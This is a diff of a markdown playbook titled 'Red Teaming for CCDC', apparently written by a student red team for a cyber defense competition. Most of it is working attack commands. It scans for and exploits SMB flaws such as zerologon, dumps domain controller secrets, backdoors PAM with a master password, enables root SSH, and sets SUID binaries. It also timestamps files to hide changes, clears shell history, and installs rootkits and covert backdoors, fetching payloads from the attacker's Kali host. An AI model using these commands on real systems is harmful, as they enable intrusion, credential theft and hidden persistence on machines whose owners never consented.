@@ -11,6 +11,7 @@ pagetitle: Red Teaming for CCDC
   - Quickly nmap scan for port 445, as this will almost always be our gateway in
   - `sudo nmap -T4 -min-hostgroup 96 -p 53,445 --open {IP_range} | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u > smb_ips.txt`
     - `-min-hostgroup` will divide the range up into 96 sup parts
+    - Instead of `-T4`, we can specify `--max-retries 2 --max-rtt-timeout {double_time_to_ping}ms --min-rate 300`
   - Then, check SMB IPs with `while read -r line; do nxc smb $line -u '' -p '' -M zerologon -M printnightmare -M smbghost -M ms17-010; done < smb_ips.txt` 
     - If we get a zerologon hit, run `zerologon.py` and then `impacket-secretsdump -just-dc -no-pass {domain}/{machine_name}:@{DC_IP}`
       - e.g. `impacket-secretsdump -just-dc -no-pass 'corp.local/TEST-DC$@10.10.0.162'` (if DC name is TEST-DC)
@@ -78,38 +79,45 @@ pagetitle: Red Teaming for CCDC
 **Linux:**
 - Todo:
   - Create a big zipped folder containing all necessary files (attacker and client)
+    - This will be our kali-setup zip to download
   - Write a persistence script that does the following
     - Gets all relevant files from kali
-    - Backdoors PAM and adds the master password
-    - Permits root login: `sed -i '/PermitRootLogin/c\PermitRootLogin yes' /etc/ssh/sshd_config && touch -d "May 26 2020" /etc/ssh/sshd_config`
-    - Adds a sliver script somewhere in the system
-    - Add suid dash: `chmod u+s $(which dash) && touch -d "April 16 2018" $(which dash)`
+    - Backdoors PAM (adds the master password and logs new passwords)
+    - Permits root login: `sed -i '/PermitRootLogin/c\PermitRootLogin yes' /etc/ssh/sshd_config `
+    - Adds a Prism/boopkit service
+      - Hidden files lends itself EXTREMELY well to services
+        - However, once running, we can see it with `systemctl | grep "reptile"` so might need to set the overall prefix to something like "cpu"
+        - May also need to hide the prism/boopkit PID
+      - boopkit is better, but only works on 5.x+
+    - Add suid `ip`, `chroot`, and `ssh-keygen` (move `ssh-keygen` to `/usr/lib/openssh/`)
+      - `chmod u+s $(which env) $(which ip) $(which chroot)`
     - Runs prism (on startup)
-    - Hides all of the above with a rootkit
+    - Hides all of the above with a rootkit (and changing dates with something like `touch -d "May 26 2020" {file}`)
+      - This will likely require an internet connection or for our Kali to be able to provide necessary packages
       - If kernel 4 or below, use reptile:
         - `wget {kali_IP}:{port}/reptile.tar.gz && tar -xvf reptile.tar.gz && cd Reptile-master`
         - `apt install gcc make build-essential linux-headers-$(uname -r)`
         - Default options seem good, so `sed -i 's/reptile/redteam/g' config/defconfig && make defconfig && make && make install`
-      - If kernel 5 or above, 
-      - Will need `sysctl kernel.ftrace_enabled=1` and also check if `make` and `gcc` exist
-        - We need to look into installing these (among other packages) by pointing the installation to our IP instead of the internet
+      - If kernel 5 or above, use BDS
+        - Will need `sysctl kernel.ftrace_enabled=1` and also check if `make` and `gcc` exist
     - Clear history: ` history -c && rm -f $HISTFILE` 
       - Having space is important, seems to prevent logging even on newer kernels
-- [PANIX](https://github.com/Aegrah/PANIX)
-  - One-stop shop for a persistence script, this thing is NICE
-    - `./panix.sh --suid --default` gives SUID to dash, python, and find
-      - `dash -p`, `find . -exec /bin/sh -p \; -quit`, or `python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
-- [Prism](https://github.com/andreafabrizi/prism)
-  - Sends out a reverse shell after sending a ping with a certain payload
-    - After specifying variables in C code itself, build with `gcc -DDETACH -DNORENAME -Wall -s -static -o {outfile} prism.c`
-    - Run as root on victim, then to trigger do `sudo python2 sendPacket.py {target} {password_set} {attacker_IP} {attacker_port}`
-  - This seems kinda cool, but wouldn't be anything special unless we could somehow hide the connection with a rootkit
-- [Caraxes](https://github.com/ait-aecid/caraxes/)
-  - Seems to be pretty good for 5.14-6.11
-  - Will need to uncomment the `hide_module()` function
-  - This seems pretty good for hiding files - we can set the word to hide in `rootkit.h`
-- [TripleCross](https://github.com/h3xduck/TripleCross)
-  - Tested on 5.x kernels, so maybe a bit less reliable
+- [Boopkit](https://github.com/krisnova/boopkit)
+  - Sneaky amazing backdoor that functions via back checksum TCP packets
+  - `wget https://github.com/kris-nova/boopkit/archive/refs/tags/v1.4.1.tar.gz`
+    - `apt install clang make bpftool libbpf-dev gcc-multilib llvm libxdp-dev libpcap-dev`
+  - Then, run on victim with `boopkit -i {network_interface} -q`
+    - We need to find a way to get the default network interface
+  - Then, after making on Kali, can run `boopkit-boop -rhost {target} -rport 3535 -c '{command}' -lhost {kali_IP} -lport {kali_port}`
+  - Listens on TCP 3545 
+- [BDS](https://github.com/bluedragonsecurity/bds_lkm_ftrace)
+  - Good compatibility, works on 6.x tested
+    - Let's check out the non-ftrace one and userland one?
+    - We need to slightly modify to allow hiding arbitrary ports/sockets
+    - Removed `rc.local` persistence - non-sneaky, and borks systems with checks for kernel tainting in startup
+  - Supports hiding files, backdoors, privescs, and hiding network connections (though only its connection, but we can easily change that)
+  - Config
+    - Can be specified in `kernelspace/includes/bds_vars.h`
 - [Reptile](https://web.archive.org/web/20250703011339/https://github.com/f0rb1dd3n/Reptile/archive/refs/heads/master.zip)
   - Absolutely nutty rootkit for 2.6.x, 3.x, or 4.x, seems to be the go-to
     - Has persistent, detection evasion, a nice management interface
@@ -120,6 +128,9 @@ pagetitle: Red Teaming for CCDC
   - Install:
     - `apt install build-essential linux-headers-$(uname -r)`
     - `make menuconfig`, `make`, and `make install`
+  - Bugs:
+    - Reptile will hide more stuff than necessary in affected directories
+    - Until we fix this, we can rename `/reptile` to `/reptiled`
   - Usage:
     - `/reptile/reptile_cmd {show/hide}` to show/hide all hidden files
     - `/reptile/reptile_cmd root` to get root
@@ -131,13 +142,13 @@ pagetitle: Red Teaming for CCDC
         - Actually, having some trouble getting it working with cron jobs
       - However, ssh seems resistant. Can't seem to permit root logins with a hidden line or add an hidden authorized keys file
     - Couldn't get kali-side build working, so we can use prism for the shell
-- [Diamorphine](https://github.com/m0nad/Diamorphine/tree/master)
-  - Very nice compatibility across versions, pretty simple rootkit
-  - Usage
-    - Hide/show rootkit with `kill -63 {any_pid}`
-    - Become root with `kill -64 {any_pid}`
-    - Hide process with `kill -31 {pid_to_hide}`
-    - Hide files by modifying `MAGIC_PREFIX` in `diamorphine.h`
+- [Caraxes](https://github.com/ait-aecid/caraxes/)
+  - Seems to be pretty good for 5.14-6.11, but a bit lacking on functionality
+    - This one would make a nice starting place for building our own
+  - Will need to uncomment the `hide_module()` function
+  - Good for hiding files - we can set the word to hide in `rootkit.h`
+- [PANIX](https://github.com/Aegrah/PANIX)
+  - One-stop shop for lots of persistence methods, this thing is a great reference
 
 
 ## Domain Persistence
